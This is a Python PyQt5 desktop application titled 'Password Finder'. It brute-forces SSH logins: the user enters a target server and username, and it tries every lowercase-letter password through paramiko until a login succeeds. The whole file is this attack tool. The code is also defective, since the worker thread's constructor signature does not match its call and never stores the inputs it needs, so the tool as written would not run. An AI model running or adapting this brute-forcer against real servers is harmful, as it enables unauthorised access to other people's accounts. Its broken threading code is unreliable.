from PyQt5 import QtCore
from PyQt5.QtGui import QFont
from PyQt5.QtCore import QBasicTimer
from PyQt5.QtWidgets import * 
from PyQt5 import uic 
from PyQt5.QtCore import *
from multiprocessing import Process, Queue
from multiprocessing import Pool
from pyee import EventEmitter
import multiprocessing as mp

import sys
import paramiko
import os
import re
import time
import functions

ee = EventEmitter()

cli = paramiko.SSHClient()
cli.set_missing_host_key_policy(paramiko.AutoAddPolicy)

class MyApp(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()

    def initUI(self):
        self.lblServer = QLabel(self)
        self.lblServer.setText("please type server")
        self.lblServer.setAlignment(QtCore.Qt.AlignLeft)
        self.lblServer.move(0, 3)
        self.lblUser = QLabel(self)
        self.lblUser.setText("please type username")
        self.lblUser.setAlignment(QtCore.Qt.AlignLeft)
        self.lblUser.move(0, 43)

        self.lbl1 = QLabel(self)
        self.lbl1.move(0, 100)
        self.lbl1.setText("waiting")
        self.lbl1.repaint()

        self.textbrowser = QTextBrowser(self)
        self.textbrowser.setOpenExternalLinks(True)
        self.textbrowser.move(0, 160)
        self.textbrowser.append("waiting...")

        self.inputServer = QLineEdit(self)
        self.inputServer.move(150, 0)
        self.inputServer.textChanged.connect(self.onChanged)
        self.inputUser = QLineEdit(self)
        self.inputUser.move(150, 40)
        self.inputUser.textChanged.connect(self.onChanged)

        self.buttonStart = QPushButton(self)
        self.buttonStart.setText('Start')
        self.buttonStart.clicked.connect(self.onStart)
        self.buttonStart.move(300, 200)

        self.buttonRestart = QPushButton(self)
        self.buttonRestart.setText('Restart')
        self.buttonRestart.clicked.connect(self.onRestart)
        self.buttonRestart.move(300, 250)

        self.setWindowTitle('Password Finder')
        self.setGeometry(1000, 1000, 500, 400)
        self.show()

    def onChanged(self):
        QApplication.processEvents()
        self.lbl1.setText("Taget --------\nServer: %s\nUser: %s" % (self.inputServer.text(), self.inputUser.text()))
        self.lbl1.adjustSize()
    def onRestart(self):
        QApplication.processEvents()
        os.execl(sys.executable, '"{}"'.format(sys.executable), *sys.argv)

    def onStart(self):
        global pwMatched
        pwMatched = True
        self.th = runFunction1(self)
        self.th.start()

class runFunction1(QThread):
    threadEvent = QtCore.pyqtSignal(int)

    def __init__(self, textbrowser, serverInput, userInput):
        super().__init__()
        self = self
    
    def run(self):
        pwMatch("a", 1, self.textbrowser, self.serverInput, self.userInput, time.time())

def pwMatch(start, jump, textbrowser, serverInput, userInput, start_time):
    server = serverInput.text()
    user = userInput.text()
    serverInput.setDisabled(True)
    userInput.setDisabled(True)
    charList = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    result = start;
    start_time = time.time()
    global pwMatched
    while pwMatched:
        textbrowser.append(result)
        ok = True
        QApplication.processEvents()
        try:
            cli.connect(server, port=22, username=user, password=result)
        except paramiko.ssh_exception.AuthenticationException as e:
            ok = False
        cli.close()
        if ok == True:
            pwMatched = False
            break
        increased = functions.str_increaser(result, charList, jump)
        if increased != "str_increaser(): Input already max in charset":
            result = increased
        else:
            result = "a"+"a"*result.__len__()
    textbrowser.append("finished!"+" - "+result+"\n"+"--- "+str(round(time.time() - start_time, 2))+" seconds --- ")

if __name__ == '__main__':
    app = QApplication(sys.argv)
    ex = MyApp()
    sys.exit(app.exec_())